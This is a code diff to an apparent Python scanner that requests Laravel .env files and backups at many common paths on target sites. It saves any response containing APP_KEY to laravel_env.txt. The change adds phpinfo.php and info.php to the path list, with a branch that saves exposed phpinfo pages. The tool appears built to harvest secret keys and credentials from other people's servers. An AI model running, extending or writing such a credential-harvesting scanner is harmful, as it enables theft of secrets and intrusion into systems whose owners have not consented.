@@ -75,7 +75,7 @@ class Main:
             pass
 
     def env(self):
-        list_env = ['.env.bak', '.env', 'core/.env', 'public/.env', 'app/.env', 'laravel/core/.env', 'beta/.env', 'config/.env', 'kyc/.env', 'admin/.env', 'prod/.env', 'api/.env', 'tokenlite_app/.env', 'backend/.env', 'env.backup', '.environment', '.envrc', '.envs', '.env~', 'phpinfo', 'php_info', '_profiler/phpinfo']
+        list_env = ['.env.bak', '.env', 'core/.env', 'public/.env', 'app/.env', 'laravel/core/.env', 'beta/.env', 'config/.env', 'kyc/.env', 'admin/.env', 'prod/.env', 'api/.env', 'tokenlite_app/.env', 'backend/.env', 'env.backup', '.environment', '.envrc', '.envs', '.env~', 'phpinfo', 'php_info', '_profiler/phpinfo', 'phpinfo.php', 'info.php']
         for path in list_env:
             url_ = self.rebuild_url(path)
             try:
@@ -83,6 +83,10 @@ class Main:
                 if 'APP_KEY' in resp:
                     print(self.url + ' -> FOUND LARAVEL ENV')
                     self.saveTofile('laravel_env.txt', resp, url_)
+                    break
+                elif 'phpinfo()' in resp:
+                    print(self.url + ' -> FOUND PHPINFO')
+                    self.saveTofile('phpinfo.txt', resp, url_)
                     break
                 else:
                     if path == list_env[-1]:
